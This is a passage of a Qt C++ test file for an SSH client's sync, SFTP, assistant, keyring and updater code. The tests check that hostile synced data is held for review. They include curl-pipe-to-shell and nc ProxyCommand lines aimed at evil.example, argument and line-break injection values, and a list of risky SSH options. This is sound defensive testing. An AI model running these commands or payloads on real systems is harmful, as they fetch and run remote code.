        return file.open(QIODevice::ReadOnly) ? QJsonDocument::fromJson(file.readAll()).object() : QJsonObject();
    }
    static void writeSync(const QString &path, const QJsonObject &root)
    {
        write(path, QJsonDocument(root).toJson());
    }
    static QJsonObject syncItem(const QJsonObject &root, const QString &list, const QString &id)
    {
        for (const QJsonValue &value : root.value(list).toArray())
            if (value.toObject().value("id").toString() == id)
                return value.toObject();
        return {};
    }
    static QJsonObject withSyncItem(QJsonObject root, const QString &list, const QJsonObject &item)
    {
        QJsonArray items;
        for (const QJsonValue &value : root.value(list).toArray())
            if (value.toObject().value("id") != item.value("id"))
                items << value;
        items << item;
        root[list] = items;
        return root;
    }

    void hostileSyncFileChangesNothingOnItsOwn()
    {
        QTemporaryDir dir;
        QDir().mkpath(dir.filePath("shared"));
        const QString shared = dir.filePath("shared/tether-hosts.json");
        const QString config = dir.filePath("a.json");
        auto backend = std::make_unique<Backend>(config, dir.filePath("ssh_config"), dir.filePath("logs"));
        backend->setTool("ssh", "/usr/bin/ssh");
        QCOMPARE(backend->saveSnippet({{"name", "Uptime"}, {"text", "uptime"}, {"run", true}}), QString());
        const QString snippetId = backend->snippets().value(0).toMap()["id"].toString();
        QCOMPARE(backend->saveProfile({{"kind", "ssh"}, {"name", "Web"}, {"host", "web.example"}, {"user", "me"}}), QString());
        const QString id = backend->profiles().value(0).toMap()["id"].toString();
        QCOMPARE(backend->setSetting("syncFolder", dir.filePath("shared")), QString());
        const QJsonObject clean = readSync(shared);
        QCOMPARE(clean["profiles"].toArray().size(), 1);
        QSignalSpy review(backend.get(), &Backend::syncReviewChanged);

        // The audit's file: the same host id, now running a program on this
        // computer, with host checks off and a startup snippet that pipes a
        // download into a shell.
        QJsonObject evil = syncItem(clean, "profiles", id);
        evil["options"] = "ProxyCommand=sh -c 'curl evil.example | sh'\nStrictHostKeyChecking no";
        evil["host"] = "evil.example";
        evil["startupSnippets"] = QJsonArray{"evil-snippet"};
        evil["modified"] = double(QDateTime::currentMSecsSinceEpoch() + 1000);
        QJsonObject snippet = syncItem(clean, "snippets", snippetId);
        snippet["text"] = "curl evil.example | sh";
        snippet["modified"] = evil["modified"];
        QJsonObject file = withSyncItem(withSyncItem(clean, "profiles", evil), "snippets", snippet);
        file = withSyncItem(file, "snippets", QJsonObject{{"id", "evil-snippet"}, {"name", "Setup"}, {"text", "curl x | sh"}, {"run", true}});
        // A new host that runs a program, and logins no dialog would accept.
        file = withSyncItem(file, "profiles", QJsonObject{{"id", "new-evil"}, {"kind", "ssh"}, {"name", "Backup"}, {"host", "backup.example"},
                                                          {"options", "proxycommand   nc evil.example 22"}});
        file = withSyncItem(file, "profiles", QJsonObject{{"id", "new-fine"}, {"kind", "ssh"}, {"name", "Docs"}, {"host", "docs.example"},
                                                          {"options", "ServerAliveInterval=30"}});
        file = withSyncItem(file, "identities", QJsonObject{{"id", "bad-login"}, {"name", "Root"}, {"user", "-oProxyCommand=x"}});
        file = withSyncItem(file, "identities", QJsonObject{{"id", "odd-login"}, {"name", "Ops"}, {"user", "ops"}, {"hasPassword", true},
                                                            {"shell", "/bin/evil"}});
        writeSync(shared, file);
        QTRY_VERIFY_WITH_TIMEOUT(review.count() > 0, 5000);

        // The saved host is as it was, and so is the command it runs.
        auto host = [&](const QString &which) {
            for (const QVariant &value : backend->profiles())
                if (value.toMap()["id"] == which)
                    return value.toMap();
            return QVariantMap();
        };
        QCOMPARE(host(id)["host"].toString(), QString("web.example"));
        QCOMPARE(host(id)["options"].toString(), QString());
        QVERIFY(host(id)["startupSnippets"].toList().isEmpty());
        const QString command = backend->launch(host(id))["args"].toStringList().join(' ');
        QVERIFY2(!command.contains("ProxyCommand") && !command.contains("evil"), qPrintable(command));
        // The changed snippet still types what it did.
        for (const QVariant &value : backend->snippets())
            if (value.toMap()["id"] == snippetId)
                QCOMPARE(value.toMap()["text"].toString(), QString("uptime"));
        // The harmless new host came in; the one with a ProxyCommand didn't.
        QCOMPARE(host("new-fine")["host"].toString(), QString("docs.example"));
        QVERIFY(host("new-evil").isEmpty());
        // Logins are checked like the vault's dialog checks them, cut down to
        // a login's own fields, and "has a password" is this computer's to say.
        QCOMPARE(backend->identities().size(), 1);
        const QVariantMap login = backend->identities().value(0).toMap();
        QCOMPARE(login["user"].toString(), QString("ops"));
        QVERIFY(!login["hasPassword"].toBool());
        QVERIFY(!login.contains("shell"));

        // What waits says what it would change, and names the options.
        auto waiting = [&](const QString &which) {
            for (const QVariant &value : backend->syncReview())
                if (value.toMap()["id"] == which)
                    return value.toMap();
            return QVariantMap();
        };
        QCOMPARE(backend->syncReview().size(), 3);
        QVERIFY(!waiting(id)["isNew"].toBool());
        QCOMPARE(waiting(id)["risky"].toStringList(), QStringList({"ProxyCommand", "StrictHostKeyChecking"}));
        QStringList labels;
        for (const QVariant &change : waiting(id)["changes"].toList())
            labels << change.toMap()["label"].toString();
        QVERIFY2(labels.contains("Address") && labels.contains("ssh options") && labels.contains("Startup snippets"),
                 qPrintable(labels.join(", ")));
        QVERIFY(waiting("new-evil")["isNew"].toBool());
        QCOMPARE(waiting("new-evil")["risky"].toStringList(), QStringList({"proxycommand"}));
        QCOMPARE(waiting(snippetId)["type"].toString(), QString("snippet"));

        // Saving something else doesn't write this computer's older copy over
        // the waiting one, which would undo the other computer's edit there.
        QCOMPARE(backend->saveProfile({{"kind", "ssh"}, {"name", "Mine"}, {"host", "mine.example"}}), QString());
        QCOMPARE(syncItem(readSync(shared), "profiles", id)["host"].toString(), QString("evil.example"));
        QCOMPARE(syncItem(readSync(shared), "profiles", "new-evil")["name"].toString(), QString("Backup"));
        QCOMPARE(backend->syncReview().size(), 3);

        // It all survives a restart, still waiting and still not in use.
        backend.reset();
        backend = std::make_unique<Backend>(config, dir.filePath("ssh_config"), dir.filePath("logs"));
        backend->setTool("ssh", "/usr/bin/ssh");
        QCOMPARE(backend->syncReview().size(), 3);
        QCOMPARE(host(id)["host"].toString(), QString("web.example"));

        // Turned down: this computer's copy stays and is now the newer one,
        // so it goes back to the file; the new host isn't offered again but
        // stays in the file for the computers that want it.
        QCOMPARE(backend->rejectSync(), QString());
        QVERIFY(backend->syncReview().isEmpty());
        QCOMPARE(host(id)["host"].toString(), QString("web.example"));
        QVERIFY(host("new-evil").isEmpty());
        QCOMPARE(syncItem(readSync(shared), "profiles", id)["host"].toString(), QString("web.example"));
        QVERIFY(syncItem(readSync(shared), "profiles", id)["modified"].toDouble() > evil["modified"].toDouble() - 2000);
        QCOMPARE(syncItem(readSync(shared), "profiles", "new-evil")["name"].toString(), QString("Backup"));
        // The same file again (the intruder's copy coming back) is still older
        // or already turned down: nothing waits.
        writeSync(shared, withSyncItem(readSync(shared), "profiles", evil));
        QTest::qWait(900);
        QCOMPARE(host(id)["host"].toString(), QString("web.example"));
        backend.reset();
        backend = std::make_unique<Backend>(config, dir.filePath("ssh_config"), dir.filePath("logs"));
        QVERIFY(backend->syncReview().isEmpty());
        QVERIFY(host("new-evil").isEmpty());
        // A different ProxyCommand for it is a new question.
        QSignalSpy asked(backend.get(), &Backend::syncReviewChanged);
        QJsonObject other = syncItem(readSync(shared), "profiles", "new-evil");
        other["options"] = "ProxyCommand=nc other.example 22";
        writeSync(shared, withSyncItem(readSync(shared), "profiles", other));
        QTRY_COMPARE_WITH_TIMEOUT(backend->syncReview().size(), 1, 5000);
        // Accepted, it is a host like any other.
        QCOMPARE(backend->approveSync("new-evil"), QString());
        QVERIFY(backend->syncReview().isEmpty());
        QCOMPARE(host("new-evil")["options"].toString(), QString("ProxyCommand=nc other.example 22"));
    }

    void syncKeepsTheNewerEditAndAsksAboutAddresses()
    {
        QTemporaryDir dir;
        QDir().mkpath(dir.filePath("shared"));
        const QString shared = dir.filePath("shared/tether-hosts.json");
        Backend a(dir.filePath("a.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        Backend b(dir.filePath("b.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        QCOMPARE(a.saveProfile({{"kind", "ssh"}, {"name", "Web"}, {"host", "web.example"}}), QString());
        const QString id = a.profiles().value(0).toMap()["id"].toString();
        QCOMPARE(a.setSetting("syncFolder", dir.filePath("shared")), QString());
        QCOMPARE(b.setSetting("syncFolder", dir.filePath("shared")), QString());
        QCOMPARE(b.profiles().size(), 1);
        auto host = [&](Backend &backend) { return backend.profiles().value(0).toMap(); };

        // A change that doesn't touch where the host connects just arrives.
        QVariantMap renamed = host(a);
        renamed["name"] = "Web server";
        renamed["log"] = true;
        QTest::qWait(5);
        QCOMPARE(a.saveProfile(renamed), QString());
        QTRY_COMPARE_WITH_TIMEOUT(host(b)["name"].toString(), QString("Web server"), 5000);
        QVERIFY(b.syncReview().isEmpty());

        // A new address from the other computer waits for a yes here, and
        // the old one stays in use; accepted, both agree.
        QVariantMap moved = host(a);
        moved["host"] = "web2.example";
        QTest::qWait(5);
        QCOMPARE(a.saveProfile(moved), QString());
        QTRY_COMPARE_WITH_TIMEOUT(b.syncReview().size(), 1, 5000);
        QCOMPARE(host(b)["host"].toString(), QString("web.example"));
        const QVariantMap change = b.syncReview().value(0).toMap()["changes"].toList().value(0).toMap();
        QCOMPARE(change["before"].toString(), QString("web.example"));
        QCOMPARE(change["after"].toString(), QString("web2.example"));
        QCOMPARE(b.approveSync(id), QString());
        QCOMPARE(host(b)["host"].toString(), QString("web2.example"));
        QTest::qWait(900);
        QVERIFY(a.syncReview().isEmpty());
        QCOMPARE(host(a)["host"].toString(), QString("web2.example"));

        // Two computers edit the same host; the file ends up with the older
        // edit (a sync tool picked it). The newer one isn't lost: it stays
        // here and goes back to the file.
        const QJsonObject before = readSync(shared);
        QVariantMap newer = host(a);
        newer["name"] = "Web (newer)";
        QTest::qWait(5);
        QCOMPARE(a.saveProfile(newer), QString());
        QJsonObject older = syncItem(before, "profiles", id);
        older["name"] = "Web (older)";
        writeSync(shared, withSyncItem(readSync(shared), "profiles", older));
        QTRY_COMPARE_WITH_TIMEOUT(syncItem(readSync(shared), "profiles", id)["name"].toString(), QString("Web (newer)"), 5000);
        QCOMPARE(host(a)["name"].toString(), QString("Web (newer)"));
        QTRY_COMPARE_WITH_TIMEOUT(host(b)["name"].toString(), QString("Web (newer)"), 5000);

        // An older Tether writes no times: its edits still arrive (and its
        // address changes are still asked about).
        QJsonObject legacy = syncItem(readSync(shared), "profiles", id);
        legacy.remove("modified");
        legacy["name"] = "Web (old app)";
        writeSync(shared, withSyncItem(readSync(shared), "profiles", legacy));
        QTRY_COMPARE_WITH_TIMEOUT(host(a)["name"].toString(), QString("Web (old app)"), 5000);

        // Removed by sync and brought back under the same id with another
        // address: that's a change to a host this computer knew, not a new
        // host, so it waits.
        QJsonObject gone = readSync(shared);
        gone["profiles"] = QJsonArray();
        gone["removed"] = QJsonArray{id};
        writeSync(shared, gone);
        QTRY_VERIFY_WITH_TIMEOUT(a.profiles().isEmpty(), 5000);
        QJsonObject back = legacy;
        back["host"] = "elsewhere.example";
        QJsonObject returned = readSync(shared);
        returned["removed"] = QJsonArray();
        writeSync(shared, withSyncItem(returned, "profiles", back));
        QTRY_COMPARE_WITH_TIMEOUT(a.syncReview().size(), 1, 5000);
        QVERIFY(a.profiles().isEmpty());
        QCOMPARE(a.syncReview().value(0).toMap()["changes"].toList().value(0).toMap()["before"].toString(),
                 QString("web2.example"));
        // Brought back as it was, it simply returns.
        writeSync(shared, withSyncItem(returned, "profiles", legacy));
        QTRY_COMPARE_WITH_TIMEOUT(a.profiles().size(), 1, 5000);
        QVERIFY(a.syncReview().isEmpty());
    }

    void riskySshOptionsAreNamed()
    {
        QCOMPARE(Backend::riskyOptions({{"options", "ServerAliveInterval=30\nCompression yes"}}), QStringList());
        QCOMPARE(Backend::riskyOptions({{"options", "PROXYCOMMAND = nc %h %p\nLocalCommand=x\npermitlocalcommand yes\n"
                                                   "KnownHostsCommand /bin/x\nStrictHostKeyChecking=no\n"
                                                   "UserKnownHostsFile /dev/null\nPKCS11Provider=/tmp/x.so"}}),
                 QStringList({"PROXYCOMMAND", "LocalCommand", "permitlocalcommand", "KnownHostsCommand",
                              "StrictHostKeyChecking", "UserKnownHostsFile", "PKCS11Provider"}));
    }

    void sftpReusesTheLogin()
    {
        QTemporaryDir dir;
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("sftp", "/usr/bin/sftp");
        const QVariantMap command = backend.sftpCommand({{"kind", "ssh"}, {"name", "Web"}, {"host", "web"},
                                                         {"user", "me"}, {"port", 2222},
                                                         {"options", "RemoteCommand=tmux\nCompression=yes"}});
        QVERIFY2(!command.contains("error"), qPrintable(command.value("error").toString()));
        const QStringList args = command["args"].toStringList();
        QCOMPARE(args.mid(0, 3), QStringList({"-q", "-b", "-"}));
        QVERIFY(args.contains("Port=2222"));
        QVERIFY(args.contains("User=me"));
        QVERIFY(args.contains("Compression=yes"));
        QVERIFY(!args.join(' ').contains("RemoteCommand"));
        QVERIFY(args.contains("ControlMaster=auto"));
        QCOMPARE(args.mid(args.size() - 2), QStringList({"--", "web"}));
        QVERIFY(command["environment"].toStringList().contains("TETHER_ASKPASS_NOTTY=1"));
        QVERIFY(backend.sftpCommand({{"kind", "serial"}}).contains("error"));
    }

    void sftpListingsAndQuoting()
    {
        const QString out =
            "sftp> pwd\nRemote working directory: /home/me\nsftp> ls -lan\n"
            "drwxr-xr-x    ? 1000     1000         4096 Nov  7 12:00 .\n"
            "drwxr-xr-x    ? 0        0            4096 Jan  2  2025 ..\n"
            "-rw-r--r--    ? 1000     1000          220 Nov  7 12:00 b file.txt\n"
            "drwx------    ? 1000     1000         4096 Nov  6 09:15 Projects\n"
            "lrwxrwxrwx    ? 1000     1000           11 Nov  6 09:15 latest -> Projects/x\n";
        QCOMPARE(SftpBrowser::parsePwd(out), QString("/home/me"));
        const QVariantList entries = SftpBrowser::parseListing(out);
        QCOMPARE(entries.size(), 3);
        QCOMPARE(entries[0].toMap()["name"].toString(), QString("Projects"));
        QVERIFY(entries[0].toMap()["folder"].toBool());
        QCOMPARE(entries[1].toMap()["name"].toString(), QString("b file.txt"));
        QCOMPARE(entries[1].toMap()["size"].toLongLong(), 220);
        QCOMPARE(entries[2].toMap()["name"].toString(), QString("latest"));
        QVERIFY(entries[2].toMap()["link"].toBool());
        QCOMPARE(SftpBrowser::quote("a \"b\" *.txt"), QString("\"a \\\"b\\\" \\*.txt\""));
    }

    void sftpRefusesNamesWithLineBreaks()
    {
        // sftp reads a command per line, so the rest of such a name would be
        // the next command, and "!…" runs a program on this computer.
        QTemporaryDir dir;
        const QString fake = dir.filePath("sftp");
        write(fake, QString("#!/bin/sh\ncat >> '%1'\necho 'Remote working directory: /home/me'\n").arg(dir.filePath("batch")).toUtf8());
        QFile::setPermissions(fake, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
        SftpBrowser browser;
        QSignalSpy busy(&browser, &SftpBrowser::busyChanged);
        browser.start({{"program", fake}, {"args", QStringList()}});
        QTRY_VERIFY_WITH_TIMEOUT(!browser.busy() && browser.path() == "/home/me", 5000);
        auto batch = [&] {
            QFile file(dir.filePath("batch"));
            return file.open(QIODevice::ReadOnly) ? QString::fromUtf8(file.readAll()) : QString();
        };
        const QString evil = QString("notes.txt\n!touch %1").arg(dir.filePath("ran"));
        browser.upload({QUrl::fromLocalFile(dir.filePath(evil))});
        QVERIFY(!browser.busy());
        QVERIFY(!browser.error().isEmpty());
        browser.makeFolder("a\rb");
        browser.remove("x\n!id", false);
        browser.rename("old", "new\n!id");
        browser.download({"a\n!id"});
        browser.open("sub\n!id");
        QVERIFY(!browser.busy());
        QVERIFY2(!batch().contains("!"), qPrintable(batch()));
        // An ordinary name still goes through, quoted.
        browser.makeFolder("New folder");
        QTRY_VERIFY_WITH_TIMEOUT(batch().contains("mkdir \"New folder\""), 5000);
        QTRY_VERIFY_WITH_TIMEOUT(!browser.busy(), 5000);
        QCOMPARE(browser.error(), QString());
        QVERIFY(!QFile::exists(dir.filePath("ran")));
    }

    void assistantAsksForOneCommand()
    {
        const QJsonObject body = QJsonDocument::fromJson(
            Assistant::requestBody("find big files", {{"kind", "ssh"}, {"host", "web"}, {"user", "me"}})).object();
        QCOMPARE(body["model"].toString(), QString("claude-opus-5-5"));
        QCOMPARE(body["fallbacks"].toString(), QString("default"));
        QCOMPARE(body["output_config"].toObject()["format"].toObject()["type"].toString(), QString("json_schema"));
        QVERIFY(body["messages"].toArray()[0].toObject()["content"].toString().contains("ssh to me@web"));

        const QJsonObject answerJson{{"command", "du -ah . | sort -rh | head"}, {"explanation", "Lists."}, {"risky", false}};
        const QJsonObject reply{
            {"stop_reason", "end_turn"},
            {"content", QJsonArray{QJsonObject{{"type", "thinking"}, {"thinking", ""}},
                                   QJsonObject{{"type", "text"},
                                               {"text", QString::fromUtf8(QJsonDocument(answerJson).toJson())}}}}};
        const QByteArray ok = QJsonDocument(reply).toJson();
        const QVariantMap answer = Assistant::parseResponse(200, ok);
        QCOMPARE(answer["command"].toString(), QString("du -ah . | sort -rh | head"));
        QVERIFY(!answer["risky"].toBool());
        QVERIFY(Assistant::parseResponse(200, QJsonDocument(QJsonObject{{"stop_reason", "refusal"}}).toJson()).contains("error"));
        QVERIFY(Assistant::parseResponse(401, "{}").contains("error"));

        QTemporaryDir dir;
        Assistant assistant(dir.filePath("key"));
        if (qEnvironmentVariableIsEmpty("ANTHROPIC_API_KEY")) {
            QCOMPARE(assistant.keySource(), QString());
            QCOMPARE(assistant.saveKey("sk-ant-test"), QString());
            QCOMPARE(assistant.keySource(), QString("saved"));
            QCOMPARE(QFileInfo(dir.filePath("key")).permissions() & (QFile::ReadOther | QFile::ReadGroup), QFile::Permissions());
        }
    }

    void apiKeyLivesInTheKeyring()
    {
        if (!qEnvironmentVariableIsEmpty("ANTHROPIC_API_KEY"))
            QSKIP("ANTHROPIC_API_KEY is set here, which comes first.");
        QTemporaryDir dir;
        // A stand-in keyring: one entry, kept in a file.
        const QString fake = dir.filePath("secret-tool"), ring = dir.filePath("keyring");
        write(fake, QString("#!/bin/sh\necho \"$@\" >> '%1.calls'\ncase \"$1\" in\nstore) cat > '%1' ;;\n"
                            "lookup) [ -f '%1' ] && cat '%1' ;;\nclear) rm -f '%1' ;;\nesac\n").arg(ring).toUtf8());
        QFile::setPermissions(fake, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
        auto ringHolds = [&] {
            QFile file(ring);
            return file.open(QIODevice::ReadOnly) ? QString::fromUtf8(file.readAll()) : QString();
        };

        // A key an older Tether left in its file moves to the keyring, and
        // the file goes once the keyring has it.
        write(dir.filePath("key"), "sk-ant-from-file");
        {
            Assistant assistant(dir.filePath("key"), nullptr, fake);
            QCOMPARE(assistant.keySource(), QString("saved"));
            QTRY_COMPARE_WITH_TIMEOUT(assistant.keyStore(), QString("keyring"), 5000);
            QTRY_VERIFY_WITH_TIMEOUT(!QFile::exists(dir.filePath("key")), 5000);
            QCOMPARE(ringHolds(), QString("sk-ant-from-file"));
        }
        // Next start it comes from the keyring; a new key replaces it there.
        {
            Assistant assistant(dir.filePath("key"), nullptr, fake);
            QTRY_COMPARE_WITH_TIMEOUT(assistant.keySource(), QString("saved"), 5000);
            QCOMPARE(assistant.keyStore(), QString("keyring"));
            QCOMPARE(assistant.saveKey("sk-ant-new"), QString());
            QCOMPARE(assistant.keySource(), QString("saved"));
            QTRY_COMPARE_WITH_TIMEOUT(ringHolds(), QString("sk-ant-new"), 5000);
            QVERIFY(!QFile::exists(dir.filePath("key")));
            // Removed: gone from the keyring too.
            QCOMPARE(assistant.saveKey(""), QString());
            QCOMPARE(assistant.keySource(), QString());
            QTRY_VERIFY_WITH_TIMEOUT(!QFile::exists(ring), 5000);
        }
        // A keyring that won't take it: the file, readable only by the user.
        write(fake, "#!/bin/sh\nexit 1\n");
        {
            Assistant assistant(dir.filePath("key"), nullptr, fake);
            QCOMPARE(assistant.saveKey("sk-ant-fallback"), QString());
            QTRY_COMPARE_WITH_TIMEOUT(assistant.keyStore(), QString("file"), 5000);
            QCOMPARE(assistant.keySource(), QString("saved"));
            QCOMPARE(QFileInfo(dir.filePath("key")).permissions() & (QFile::ReadOther | QFile::ReadGroup), QFile::Permissions());
        }
    }

    void updatesCompareVersionsAndPickTheRightDownload()
    {
        QCOMPARE(Updater::compareVersions("0.2.0", "0.1.9"), 1);
        QCOMPARE(Updater::compareVersions("v0.10.0", "0.9.9"), 1);
        QCOMPARE(Updater::compareVersions("1.0", "1.0.0"), 0);
        QCOMPARE(Updater::compareVersions("0.2.0-rc1", "0.2.1"), -1);
        const QVariantList assets{
            QVariantMap{{"name", "tether-debug-0.3.0-1-x86_64.pkg.tar.zst"}},
            QVariantMap{{"name", "tether-0.3.0-1-x86_64.pkg.tar.zst"}},
            QVariantMap{{"name", "Tether-0.3.0-setup.exe"}},
            QVariantMap{{"name", "Tether-0.3.0-x86_64.AppImage"}},
            QVariantMap{{"name", "Tether-0.3.0-android-arm64.apk"}}};
        QCOMPARE(Updater::pickAsset(assets, "pacman")["name"].toString(), QString("tether-0.3.0-1-x86_64.pkg.tar.zst"));
        QCOMPARE(Updater::pickAsset(assets, "windows")["name"].toString(), QString("Tether-0.3.0-setup.exe"));
        QCOMPARE(Updater::pickAsset(assets, "appimage")["name"].toString(), QString("Tether-0.3.0-x86_64.AppImage"));
        QCOMPARE(Updater::pickAsset(assets, "android")["name"].toString(), QString("Tether-0.3.0-android-arm64.apk"));
        QVERIFY(Updater::pickAsset(assets, "page").isEmpty());
        // Your own server's latest.json: files relative to it, with checksums.
        Updater mirror("oren1031/tether", "0.4.0");
        const QJsonObject manifest{{"version", "0.5.1"}, {"notes", "Fixes"}, {"page", "https://example.com/r"},
            {"assets", QJsonArray{QJsonObject{{"name", "tether-0.5.1-1-x86_64.pkg.tar.zst"}, {"size", 10},
                                              {"sha256", "abc"}, {"url", "0.5.1/tether-0.5.1-1-x86_64.pkg.tar.zst"}}}}};
        QVERIFY(mirror.readRelease(manifest, QUrl("https://tether.example.com/latest.json")));
        QCOMPARE(mirror.latestVersion(), QString("0.5.1"));
        // The file and its checksum only exist for systems the asset is for.
        if (mirror.installKind() == "pacman") {
            QCOMPARE(mirror.expectedSha256(), QString("abc"));
            QCOMPARE(mirror.sources().value(0).toString(),
                     QString("https://tether.example.com/0.5.1/tether-0.5.1-1-x86_64.pkg.tar.zst"));
        }
        // GitHub's: the API link first (it works when download links don't), then the download link.
        const QJsonObject github{{"tag_name", "v0.5.1"}, {"body", "Fixes"},
            {"assets", QJsonArray{QJsonObject{{"name", "tether-0.5.1-1-x86_64.pkg.tar.zst"}, {"size", 10},
                                              {"digest", "sha256:def"},
                                              {"url", "https://api.github.com/repos/o/t/releases/assets/1"},
                                              {"browser_download_url", "https://github.com/o/t/releases/download/v0.5.1/x"}}}}};
        QVERIFY(mirror.readRelease(github, QUrl()));
        if (mirror.installKind() == "pacman") {
            QCOMPARE(mirror.expectedSha256(), QString("def"));
            QCOMPARE(mirror.sources().size(), 2);
            QCOMPARE(mirror.sources().first().host(), QString("api.github.com"));
        }
        Updater none({}, "0.2.0");
        QVERIFY(!none.configured());
    }

    void assistantCanUseClaudeCodeOnASubscription()
    {
        // The request isn't an argument, where the process list would show
        // it to every user of the computer; it goes in on standard input.
        const QStringList args = Assistant::claudeCodeArguments();
        QCOMPARE(args[0], QString("-p"));
        QCOMPARE(args[1], QString("--output-format"));
        QVERIFY(!args.join(' ').contains("Session:"));
        {
            QTemporaryDir bin;
            const QString fake = bin.filePath("claude");
            write(fake, QString("#!/bin/sh\necho \"$@\" > '%1'\ncat > '%2'\n"
                                "echo '{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":false,"
                                "\"structured_output\":{\"command\":\"ss -tlnp\",\"explanation\":\"Lists.\",\"risky\":false}}'\n")
                           .arg(bin.filePath("args"), bin.filePath("stdin")).toUtf8());
            QFile::setPermissions(fake, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
            const QByteArray path = qgetenv("PATH"), home = qgetenv("HOME");
            qputenv("PATH", bin.path().toUtf8() + ":" + path);
            Assistant viaCode(bin.filePath("key"));
            qputenv("PATH", path);
            QCOMPARE(viaCode.claudeCode(), fake);
            viaCode.setProvider("claude-code");
            QSignalSpy answered(&viaCode, &Assistant::answered);
            viaCode.ask("list the secret ports", {{"kind", "ssh"}, {"host", "web"}, {"user", "me"}});
            QVERIFY(answered.wait(10000));
            QCOMPARE(answered.first().first().toString(), QString("ss -tlnp"));
            QFile sent(bin.filePath("stdin")), given(bin.filePath("args"));
            QVERIFY(sent.open(QIODevice::ReadOnly) && given.open(QIODevice::ReadOnly));
            const QString onStdin = QString::fromUtf8(sent.readAll()), asArgs = QString::fromUtf8(given.readAll());
            QVERIFY(onStdin.contains("list the secret ports") && onStdin.contains("ssh to me@web"));
            QVERIFY2(!asArgs.contains("secret ports") && !asArgs.contains("me@web"), qPrintable(asArgs));
        }
        QVERIFY(args.contains("--json-schema"));
        // No tools: Claude Code only answers, it never runs anything itself.
        QCOMPARE(args[args.indexOf("--tools") + 1], QString());
        QVERIFY(args.contains("--no-session-persistence"));

        const QJsonObject ok{{"type", "result"}, {"subtype", "success"}, {"is_error", false},
                             {"structured_output", QJsonObject{{"command", "ss -tlnp"}, {"explanation", "Lists."},
                                                               {"risky", false}}}};
        QCOMPARE(Assistant::parseClaudeCode(0, QJsonDocument(ok).toJson(), {})["command"].toString(), QString("ss -tlnp"));
        const QJsonObject bad{{"type", "result"}, {"subtype", "success"}, {"is_error", true}, {"result", "Not logged in"}};
        QCOMPARE(Assistant::parseClaudeCode(1, QJsonDocument(bad).toJson(), {})["error"].toString(), QString("Not logged in"));
        QVERIFY(Assistant::parseClaudeCode(1, "", "Please run /login").value("error").toString().contains("signed in"));

        QTemporaryDir dir;
        Assistant assistant(dir.filePath("key"));
        assistant.setProvider("claude-code");
        QCOMPARE(assistant.route(), assistant.claudeCode().isEmpty() ? QString() : QString("claude-code"));
        assistant.setProvider("nonsense");
        QCOMPARE(assistant.provider(), QString("auto"));
    }

    void forgettingAChangedHostKey()
    {
        QTemporaryDir dir;
        // A stand-in ssh-keygen that records what it was asked, so the real
        // known_hosts isn't touched.
        const QString fake = dir.filePath("ssh-keygen");
        write(fake, QString("#!/bin/sh\necho \"$@\" > '%1'\n").arg(dir.filePath("args")).toUtf8());
        QFile::setPermissions(fake, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("ssh", "/usr/bin/ssh");
        backend.setTool("ssh-keygen", fake);
        // ssh-keygen runs in the background; the answer carries the asker's token.
        QSignalSpy forgotten(&backend, &Backend::hostKeyForgotten);
        backend.forgetHostKey({{"kind", "ssh"}, {"name", "x"}, {"host", "web"}, {"port", 2222}}, "pane-7");
        QVERIFY(forgotten.wait(5000));
        QCOMPARE(forgotten.first().at(0).toString(), QString("pane-7"));
        QCOMPARE(forgotten.first().at(1).toString(), QString());
        QFile args(dir.filePath("args"));
        QVERIFY(args.open(QIODevice::ReadOnly));
        QCOMPARE(QString::fromUtf8(args.readAll()).trimmed(), QString("-R [web]:2222"));
        backend.forgetHostKey({{"kind", "ssh"}, {"host", "-oX"}}, "pane-8");
        QVERIFY(forgotten.wait(5000));
        QVERIFY(!forgotten.last().at(1).toString().isEmpty());
        write(fake, "#!/bin/sh\necho 'no such file' >&2\nexit 1\n");
        backend.forgetHostKey({{"kind", "ssh"}, {"name", "x"}, {"host", "web"}}, "pane-9");
        QVERIFY(forgotten.wait(5000));
        QVERIFY(forgotten.last().at(1).toString().contains("no such file"));

#ifdef TETHER_LIBSSH
        write(dir.filePath("known_hosts"), "web ssh-ed25519 AAAA1\n[web]:2222 ssh-ed25519 AAAA2\nother ssh-ed25519 AAAA3\n");
        QVERIFY(SshSession::forgetHost(dir.filePath("known_hosts"), "web", 2222));
        QFile known(dir.filePath("known_hosts"));
        QVERIFY(known.open(QIODevice::ReadOnly));
        const QByteArray left = known.readAll();
        QVERIFY(left.contains("web ssh-ed25519 AAAA1"));
        QVERIFY(!left.contains("AAAA2"));
        QVERIFY(left.contains("other"));

        // The saved keys of a host, as fingerprints to show beside a new one.
        write(dir.filePath("known_hosts"),
              "web ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlNzf+gXq5FiE2CBcdgvlgMfKFqLNDo4wnYITdFhF2Q\n"
              "[web]:2222,alias ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlNzf+gXq5FiE2CBcdgvlgMfKFqLNDo4wnYITdFhF2Q\n"
              "other ssh-rsa AAAA\n# web ssh-ed25519 AAAA\n");
        QCOMPARE(SshSession::savedFingerprints(dir.filePath("known_hosts"), "web", 22),
                 QStringList({"SSH-ED25519 SHA256:NcNb/0mRXe5BdwnQOmYb9jlWJ4dmbhFBDB4q6/oRGoM"}));
        QCOMPARE(SshSession::savedFingerprints(dir.filePath("known_hosts"), "web", 2222).size(), 1);
        QVERIFY(SshSession::savedFingerprints(dir.filePath("known_hosts"), "nobody", 22).isEmpty());
#endif
    }

    void hostsUseBuiltInSshWithoutTheProgram()
    {
#ifdef TETHER_LIBSSH
        QTemporaryDir dir;
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("ssh", "");
        const QVariantMap launch = backend.launch({{"kind", "ssh"}, {"name", "Pi"}, {"host", "pi.local"},
                                                   {"user", "me"}, {"port", 2222}, {"persistent", true}});
        QVERIFY2(!launch.contains("error"), qPrintable(launch.value("error").toString()));
        const QVariantMap ssh = launch["ssh"].toMap();
        QCOMPARE(ssh["host"].toString(), QString("pi.local"));
